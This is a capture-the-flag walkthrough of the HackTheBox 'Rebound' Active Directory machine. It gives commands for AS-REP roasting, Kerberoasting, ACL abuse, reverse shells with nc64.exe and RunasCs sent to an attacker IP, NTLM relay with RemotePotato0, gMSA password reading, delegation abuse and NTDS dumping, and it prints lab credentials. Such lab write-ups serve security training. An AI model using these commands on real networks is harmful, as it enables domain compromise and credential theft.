# HackTheBox - Rebound

## NMAP

```bash
PORT      STATE SERVICE       VERSION                               
53/tcp    open  domain        Simple DNS Plus            
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-13 22:36:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:                 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa     
| Public Key bits: 2048                   
| Signature Algorithm: sha256WithRSAEncryption   
| Not valid before: 2023-08-25T22:48:10                              
| Not valid after:  2024-08-24T22:48:10  
| MD5:   6605cbaef659f555d80b7a18adfb6ce8
|_SHA-1: af8bec72779e7a0f41ad0302eff5a6ab22f01c74
|_ssl-date: 2023-09-13T22:38:03+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-13T22:38:04+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605cbaef659f555d80b7a18adfb6ce8
|_SHA-1: af8bec72779e7a0f41ad0302eff5a6ab22f01c74
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605cbaef659f555d80b7a18adfb6ce8
|_SHA-1: af8bec72779e7a0f41ad0302eff5a6ab22f01c74
|_ssl-date: 2023-09-13T22:38:03+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605cbaef659f555d80b7a18adfb6ce8
|_SHA-1: af8bec72779e7a0f41ad0302eff5a6ab22f01c74
|_ssl-date: 2023-09-13T22:38:04+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

First of all adding the DNS entries as some of the things won't work when it tries to reach DC

<img src="https://i.imgur.com/HaXgHv1.png"/>

Enumerating smb shares will null authentication, this shows us few shares, where `Shared` might be of some interest

<img src="https://i.imgur.com/izqBmqk.png"/>
Accessing the shared share shows that it's empty

<img src="https://i.imgur.com/kmEtXJB.png"/>

Moving on to enumerating users, we can try using `lookupsid.py` to retrieve usernames, so first trying with null authentication

<img src="https://i.imgur.com/5sjmFau.png"/>

This didn't work however we can try with `guest` account to brute force the SIDs of the users

```bash
lookupsid.py guest@rebound.htb
```

<img src="https://i.imgur.com/bux7Fwp.png"/>
We have few usernames here

```bash
ppaul
llune
fflock
```

Having the usernames, AS-REP roasting can be performed to see if any of these accounts have pre-authentication disabled, `GetNPUsers` from impacket can be used here which detects for AS-REP accounts

<img src="https://i.imgur.com/i5buwGE.png"/>

Here I got stuck for a while, not knowing what to do, check the options for lookupsid, we can specify the range for brute forcing SIDs, by default the value is 4000

```bash
lookupsid.py guest@rebound.htb 10000
```

This gives us some more user names

<img src="https://i.imgur.com/G0vMhd0.png"/>
Now again checking for pre-auth disabled accounts

```bash
GetNPUsers.py rebound.htb/uwu -usersfile users.txt -dc-ip rebound.htb
```

<img src="https://i.imgur.com/fuQf7Jz.png"/>

`jjones` had no pre-authentication required so grabbing the hash

```bash
hashcat -a 0 -m 18200 jjones.txt /usr/share/wordlists/rockyou.txt --force
```

But this wasn't crackable with the rockyou wordlist

<img src="https://i.imgur.com/lzgkTLf.png"/>

We can however obtain service ticket for a SPN, performing kerberoasting through an account having no pre-authentication required

<img src="https://i.imgur.com/KBb8N3q.png"/>

Using this https://github.com/ShutdownRepo/impacket/tree/getuserspns-nopreauth version of impacket since it has the `GetUsersSPNs` with no-preauth implementation 

<img src="https://i.imgur.com/RphxxPT.png"/>
Now using `GetUsersSPNS.py` with the jjones having no-preauthentication required we can perform ASREP-Kerberoast to retrieve the TGS hash of `ldap_monitor`

<img src="https://i.imgur.com/3zBSYrl.png"/>
Using hashcat on this hash, it gets cracked with the `1GR8t@$$4u`

<img src="https://i.imgur.com/HlGfkKd.png"/>

<img src="https://i.imgur.com/PyE9bsT.png"/>

To verify if this password isn't being used on multiple accounts we can try password spraying with  either use crackmapexec or kerbrute also synchronizing time zone with the DC 

<img src="https://i.imgur.com/1gdMafL.png"/>

<img src="https://i.imgur.com/WHzCvJM.png"/>

Enumerating the domain with `python-bloodhound` 

```bash
python3 /opt/BloodHound.py/bloodhound.py -d 'rebound.htb' -u 'oorend' -p '1GR8t@$$4u' -c all -ns 10.10.11.231
```

<img src="https://i.imgur.com/9ymfgGt.png"/>
From bloodhound, it didn't showed anything interesting paths from ldap_monitor or oorend 

<img src="https://i.imgur.com/uWBzMJM.png"/>

But we can see `ServiceMGMT` group has `GenericAll` on `Service Users` OU

<img src="https://i.imgur.com/skRCeqH.png"/>

Enumerating ACLs through `powerview.py` but it requires kerberos authentication so first we'll need to request TGT of oorend user

<img src="https://i.imgur.com/pvMUqKI.png"/>

```bash
powerview --use-ldaps -k --no-pass --dc-ip 10.10.11.231 rebound.htb/oorend@dc01.rebound.htb
```

Enumerating the access controls on service mgmt group, oorend has `Self` rights on the object

<img src="https://i.imgur.com/WSzILPK.png"/>

This means that we can make oorend as the group member of service mgmt

<img src="https://i.imgur.com/ellMfJx.png"/>

Using powerview.py we can add the group member

```bash
Add-DomainGroupMember -Identity ServiceMGMT -Members oorend
```

<img src="https://i.imgur.com/6B9dAbS.png"/>

```bash
Get-DomainGroup -Identity ServiceMGMT
```

<img src="https://i.imgur.com/E3BpYLL.png"/>

Now we have GenericAll on `Service Users` OU and under this OU we have two domain users for which we can force change password 

<img src="https://i.imgur.com/6jaaI6X.png"/>

We are only interested in changing the password of `winrm_svc` user since we can get login into DC with this user, for this we need to grant control over to oorend 

We again need to request the TGT of oorend after add him into ServiceMGMT group

```bash
Add-DomainObjectAcl -Rights 'ResetPassword' -TargetIdentity "Service Users" -PrincipalIdentity "oorend"
```

<img src="https://i.imgur.com/SziCdD3.png"/>

Logging in through `rpcclient` we can change winrm_svc's users password ( the changes get reverted back so we need to do this quickly )

<img src="https://i.imgur.com/Jv5Yg8q.png"/>

The password for this user will also be reverted so we can instead request TGT and login through winrm

<img src="https://i.imgur.com/Bpyadn0.png"/>

```bash
evil-winrm -i dc01.rebound.htb -r REBOUND.HTB
```

<img src="https://i.imgur.com/RqwGyGN.png"/>

Now our next target is `tbrady` since he can read GSMApassword of `Delegator` machine account

<img src="https://i.imgur.com/44rHkxM.png"/>

Getting a shell through nc64.exe with `RunasC.exe` to get a shell with netonly authentication

```bash
\RunasCs.exe winrm_svc 'P@assword@123' -d rebound.htb 'C:\Users\winrm_svc\Documents\nc64.exe 10.10.14.142 2222 -e cmd.exe' -l 9
```

<img src="https://i.imgur.com/zq25lTc.png"/>
After having a shell, with `quser` we can find `tbrady` being logged on the DC

<img src="https://i.imgur.com/ZN2Dv8d.png"/>

This is going to make possible for us to trigger an NTLM authentication of tbrady and capture the NTLMv2 challenge response through `RemotePotato0`

https://github.com/antonioCoco/RemotePotato0

We'll choose the second option which is `Rpc capture (hash) server + potato trigger`

```bash
.\RemotePotato0.exe -m 2 -r 10.10.14.142 -x 10.10.14.142 -p 9999 -s 1
```

On our machine we'll run socat and ntlmrealyx

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 & sudo impacket-ntlmrelayx -t ldaps://10.10.11.231
```

<img src="https://i.imgur.com/OdpiUA3.png"/>

<img src="https://i.imgur.com/UOsDNWh.png"/>

Cracking this NTLMv2 challenge response, we'll get the password for tbrady

<img src="https://i.imgur.com/5K8Ilt5.png"/>

So now getting a shell as tbrady through RunasCS by redirecting stdin, stdout and stderr of the specified command to a remote host

`RunasCs.exe tbrady 543BOMBOMBUNmanda cmd -r 10.10.14.142:2222`

<img src="https://i.imgur.com/6YlbO3S.png"/>

<img src="https://i.imgur.com/rB58Oaf.png"/>

Transferring GMSAPasswordReader

<img src="https://i.imgur.com/rdSsFge.png"/>

```bash
GMSAPasswordReader.exe --AccountName delegator
```

<img src="https://i.imgur.com/6UKJIjL.png"/>

This can also be retrieved through `bloodyAD`

```bash
bloodyAD.py -u tbrady -d rebound.htb -p 543BOMBOMBUNmanda --host 10.10.11.231 get object 'delegator$' --attr msDS-ManagedPassword
```

<img src="https://i.imgur.com/Nud25dm.png"/>

Using `StandIn` we can verify that delegator$ has constrained delegation set to `http/dc01.rebound.htb` with protocol transition set to false 

<img src="https://i.imgur.com/NLUovOK.png"/>
<img src="https://i.imgur.com/0f9G1XW.png"/>

To abuse this we need to first edit  `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on delegator$ to add any domain user that we control and request a ticket for browser SPN to impersonate as DC01$ then with http SPN we can impersonate as any domain user we want unless it's not in `protected group` or not marked `is sensitive and cannot be delegated` (this is very new to me I don't think I may have explained it correctly) so here's the resource which can help in understanding better about this scenario https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained

<img src="https://i.imgur.com/pZiq0G0.png"/>

First requesting TGT of delegator$

<img src="https://i.imgur.com/Sb6eWLR.png"/>

With `rbcd.py` we can try reading the value of  msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
impacket-rbcd 'rebound.htb/delegator$' -k -no-pass -delegate-to 'delegator$' -action read -use-ldaps -dc-ip 10.10.11.231
```

<img src="https://i.imgur.com/7m3MBSd.png"/>

We need to add ldap_monitor add in this property as this account has a SPN to dc01 `ldapmonitor/dc01.rebound.htb`

<img src="https://i.imgur.com/Zome3Xl.png"/>

```bash
impacket-rbcd 'rebound.htb/delegator$' -k -no-pass -delegate-to 'delegator$' -action write -delegate-from ldap_monitor -use-ldaps -dc-ip 10.10.11.231
```

<img src="https://i.imgur.com/BBPB7Fc.png"/>

Requesting this account's TGT and then impersonating as DC01$, reason being we can't impersonate as administrator as it's not allowed to be delegated 

<img src="https://i.imgur.com/7LRmouM.png"/>

```bash
getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass 
```

<img src="https://i.imgur.com/c9rCgXR.png"/>
<img src="https://i.imgur.com/SlCIYEw.png"/>
Now impersonating as DC01$ with HTTP SPN with the ticket obtained from browser SPN

```bash
getST.py -spn "http/dc01.rebound.htb" -impersonate "administrator" -additional-ticket "dc01\$.ccache" rebound.htb/'delegator$' -hashes :'CD903918320095660FF2E12072F5551C'
```

<img src="https://i.imgur.com/fvctFvZ.png"/>

Make sure now to have `dc01.rebound.htb` in hosts file

<img src="https://i.imgur.com/hdgVTui.png"/>

With secretsdump NTDS file can now be dumped

<img src="https://i.imgur.com/bNZmMHQ.png"/>

<img src="https://i.imgur.com/l3z6FEy.png"/>

# References

- https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
- https://github.com/fortra/impacket/tree/e915faa15c13a1f68bd6e067f8f9a8de21cef7d7
- https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
- https://github.com/aniqfakhrul/powerview.py.git
- https://www.thehacker.recipes/a-d/movement/dacl
- http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
- http://www.pseale.com/pretend-youre-on-the-domain-with-runas-netonly
- https://github.com/antonioCoco/RemotePotato0
- https://github.com/rvazarkar/GMSAPasswordReader
- https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained
- https://github.com/FuzzySecurity/StandIn
